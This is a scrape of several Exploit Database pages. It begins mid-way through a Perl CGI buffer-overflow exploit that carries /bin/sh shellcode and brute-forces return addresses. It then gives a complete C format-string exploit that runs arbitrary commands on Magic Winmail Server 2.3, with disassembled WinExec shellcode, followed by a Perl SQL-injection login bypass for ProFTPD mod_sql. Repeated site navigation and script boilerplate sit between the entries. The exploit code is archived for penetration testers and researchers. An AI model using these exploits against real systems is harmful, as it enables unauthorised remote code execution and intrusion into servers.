"\xeb\x3b\x5e\x8d\x5e\x10\x89\x1e\x8d\x7e\x18\x89\x7e\x04\x8d\x7e\x1b\x89\x7e\x08"."\xb8\x40\x40\x40\x40\x47\x8a\x07\x28\xe0\x75\xf9\x31\xc0\x88\x07\x89\x46\x0c\x88"."\x46\x17\x88\x46\x1a\x89\xf1\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"."\x80\xe8\xc0\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"."\x41\x41"."/bin/sh -c echo 'Content-Type: text/hello';echo '';"."$cmd"."@";$strret = int_to_hex($rw);$ret = string_to_ret($strret);$envvar = 'B' x (4096 - length($shellcode));$envvar .= $shellcode;# generate query string$buffer = "B" x $suffsize;$buffer .= "B" x 4800;$buffer .= $ret x 200;$request = "GET $searchpath?ul=$buffer HTTP/1.1\n"."Accept: $envvar\n"."Accept-Language: $envvar\n"."Accept-Encoding: $envvar\n"."User-Agent: Mozilla/4.0\n"."Host: $host\n"."Connection: Close\n\n";&connect_to;print "[x] Sending exploit code ..\n";print "[x] ret: $strret\n";print "[x] suf: $suffsize\n";print "[x] length:",length($request),"\n";print $conn "$request";while ($line = <$conn>) {$result .= $line;};close $conn;}sub check_result {if ($result =~ /hello/ && !($result =~ /text\/html/)){print $result;$success = 1;} else {print $result;print "[*] Failed ...\n";$success = 0;}}#########~~ end function ~~#########&check_version;for ($rawret; $rawret < 0xbfffffff;$rawret += 1024){&exploit($rawret);&check_result;if ($success == 1){exit;}sleep 1;}# milw0rm.com [2003-06-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 42
Winmail Mail Server 2.3 Build 0402 - Remote Format String - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWinmail Mail Server 2.3 Build 0402 - Remote Format StringEDB-ID:42CVE:2003-0391EDB Verified:Author:ThreaTType:remoteExploit:/Platform:WindowsDate:2003-06-11Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/******************************************************************* Magic Winmail Server 2.3(Build 0402)* Remote Format string exploit.******************************************************************* Coded by ThreaT.*** This one take advantage of a format bug in the* >>> SMTP protocol <<< (not pop3) for execute* a malicious command on a vulnerable system** usage : mwmxploit <Target IP> <command to execute remotely> [smtp port]* + The command to execute cannot exceed 90 characters +** compile : cl.exe mwmxploit.c /w********************************************************************/#include <windows.h>#include <winsock.h>#pragma comment (lib,"wsock32.lib")void main (int argc, char *argv[]){SOCKET sock;char buffer[1000];int i;// ecrasement d'un saved EIP grâce aux caractères de formatchar vuln[] ="\xec\xfc\x66\x01%x%x""\xed\xfc\x66\x01%x%x""\xee\xfc\x66\x01""%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%28x%n""%97x%n%105x%hn"/*This is my specific shellcode for execute a commandover the Magic Winmail process.This one can contain null bytes, enjoy ! :)=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=Disassembly of File: mailserver.exeCode Offset = 00001000, Code Size = 000CF000Data Offset = 000EC000, Data Size = 0002E000=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=Reference To: KERNEL32.GetModuleHandleA, Ord:0000h:004B8850 FF15AC014D00            Call dword ptr [004D01AC]Reference To: KERNEL32.ExitProcess, Ord:0000h:004B88C6 FF1598014D00            Call dword ptr [004D0198]Reference To: KERNEL32.GetProcAddress, Ord:0000h:00406CE7 8B3DEC004D00            mov edi, dword ptr [004D00EC]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=//////////////////////// My shellcode \\\\\\\\\\\\\\\\\\\\\\\\\\: EB50                    jmp 00401058: 5E                      pop esi: 8BEC                    mov ebp, esp: 83EC28                  sub esp, 00000028		// je cree un stack: C745D84B65726E          mov [ebp-28], 6E72654B: C745DC656C3332          mov [ebp-24], 32336C65 // j'y place 'Kernel32': C745E000000000          mov [ebp-20], 00000000: C745E457696E45          mov [ebp-1C], 456E6957: C745E878656300          mov [ebp-18], 00636578 // ici 'WinExec'// adaptez le shellcode en virant cette ligne si vraiment vous avez besoin// de 4 caractères de plus pour la commande à executer: C645EB00                mov [ebp-15], 00: BAAC014D00              mov edx, 004D01AC: 8D45D8                  lea eax, dword ptr [ebp-28]: 50                      push eax: FF12                    call dword ptr [edx]	// eax = GetModuleHandle ("Kernel32");: 8D5DE4                  lea ebx, dword ptr [ebp-1C]: 53                      push ebx: 50                      push eax: BAEC004D00              mov edx, 004D00EC: FF12                    call dword ptr [edx]	// GetProcAdress (eax, "WinExec");: 6A01                    push 00000001		// 1 = SW_SHOW, 0 = SW_HIDE: 56                      push esi: FFD0                    call eax			// WinExec (argv[2], SW_SHOW): BA98014D00              mov edx, 004D0198: FF12                    call dword ptr [edx]	// ExitProcess ();: E8ABFFFFFF              call 00401008\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ EOF /////////////////////////////////*/// Generated by Hex Workshop// shellcode.exe - Starting Offset: 4102 (0x00001006) Length: 87 (0x00000057)"\x00\x90\x90\x90\x90"	// sa, c'est pour bien coller"\xEB\x50\x5E\x8B\xEC\x83\xEC\x28\xC7\x45\xD8\x4B\x65\x72\x6E\xC7""\x45\xDC\x65\x6C\x33\x32\xC7\x45\xE0\x00\x00\x00\x00\xC7\x45\xE4""\x57\x69\x6E\x45\xC7\x45\xE8\x78\x65\x63\x00\xC6\x45\xEB\x00\xBA""\xAC\x01\x4D\x00\x8D\x45\xD8\x50\xFF\x12\x8D\x5D\xE4\x53\x50\xBA""\xEC\x00\x4D\x00\xFF\x12\x6A\x01\x56\xFF\xD0\xBA\x98\x01\x4D\x00""\xFF\x12\xE8\xAB\xFF\xFF\xFF";SOCKADDR_IN sin;WSADATA wsadata;WORD wVersionRequested = MAKEWORD (2,0);//printf ("* #################################### *\n""  Magic Winmail Server 2.3(Build 0402)\n""     Remote format string exploit !\n""* #################################### *\n""  Coded By ThreaT -> ThreaT\n\n");if (argc < 3 || strlen (argv[2]) > 90){printf ("usage : mwmxploit <Target IP> <command to execute> [smtp port]\n\n"" + The command to execute cannot exceed 90 characters +\n");ExitProcess (0);}if ( WSAStartup(wVersionRequested, &wsadata) ){printf ("Erreur d'initialisation winsock !\n");ExitProcess (1);}sin.sin_family = AF_INET;sin.sin_port = htons ((void *)argv[3] ? atoi (argv[3]) : 25);if ( (sin.sin_addr.s_addr = inet_addr (argv[1])) == INADDR_NONE){printf ("Erreur : L'adresse IP de la victime est incorrect !\n");ExitProcess (2);}printf ("connecting to %s on port %u...", argv[1], ntohs ( sin.sin_port ) );sock = socket (AF_INET, SOCK_STREAM, 0);if ( connect (sock, (SOCKADDR *)&sin, sizeof (sin)) ){printf ("erreur : connexion impossible !\n");ExitProcess (3);}recv (sock,buffer,1000,0);printf ("ok\n-> %s\nsending exploit code...",buffer);send (sock, vuln, strlen (vuln) + 92, 0);  // envoi du shellcodesend (sock, argv[2], strlen (argv[2]), 0); // envoi de la commandesend (sock, "\r\n", 2, 0); // validationrecv (sock,buffer,1000,0); // remote crash :)puts ("ok");}/*D:\toolz\netcat>nc 127.0.0.1 25220 M1 Magic Winmail Server 2.3(Build 0402) ESMTP readyAAAA 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x0x%.8x 0x%.8x 0x%.8x 0x%.8x 0x%.8x502 unimplemented (#5.5.1)*//*D:\>type "c:\Program Files\Magic Winmail\server\logs\smtp.log"0906/Y-01:50:30   1548 Connect from 127.0.0.10906/Y-01:51:06   1584 unrecognized command = AAAA 0x00498f71 0x0176fd100x0176fe3c 0x000000eb 0x0176ff80 0x00ee6c80 0x00000050 0x00ee60d9 0x000001020x0000011f 0x00000050 0x00eecf71 0x0000001c 0x0000001f 0x0176ff74 0x004cd2c00x00000001 0x00493e40 0x0176fd50 0x00000000 0x00ee5ea8 0x00ee5ea8 0x414141410x25783020 0x2078382e 0x2e257830 0x30207838 0x382e2578 0x78302078 0x78382e250x25783020 0x2078382e 0x2e257830*/// milw0rm.com [2003-06-11]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 43
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDProFTPd 1.2.9 RC1 - 'mod_sql' SQL InjectionEDB-ID:43CVE:2003-0500EDB Verified:Author:SpaineType:remoteExploit:/Platform:LinuxDate:2003-06-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl# ProFTPD 1.2.9 rc1 mod_sql SQL Injection remote Exploit# Spaine - 2003use IO::Socket;if(@ARGC<2){print "\nProof Of Concept Sql Inject on ProFTPD\n";print "Usage: perl poc-sqlftp <target> [1=Alternate query]\n\n";exit(0);};$server = $ARGV[0];$query = $ARGV[1];$remote =IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$server,PeerPort=>"21",Reuse=>1)or die "Can't connect. \n";if(defined($line=<$remote>)){print STDOUT $line;}# Proof of concept query, it may change on the number of rows# By default, it can query User, Pass, Uid, Gid, Shell or# User, Pass, Uid, Gid, Shell, Path, change the union query...if($query eq "1"){print $remote "USER ')UNIONSELECT'u','p',1002,1002,'/tmp','/bin/bash'WHERE(''='\n";}else{print $remote "USER ')UNION SELECT'u','p',1002,1002,'/bin/bash'WHERE(''='\n";};if(defined($line=<$remote>)){print STDOUT $line;}print $remote "PASS p\n";if(defined($line=<$remote>)){print STDOUT $line;}print "Sent query to $ARGV[0]\n";if($line =~ /230/){  #logged inprint "[------- Sql Inject Able \n";}else{print "[------- Sql Inject Unable \n";}close $remote;# milw0rm.com [2003-06-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit 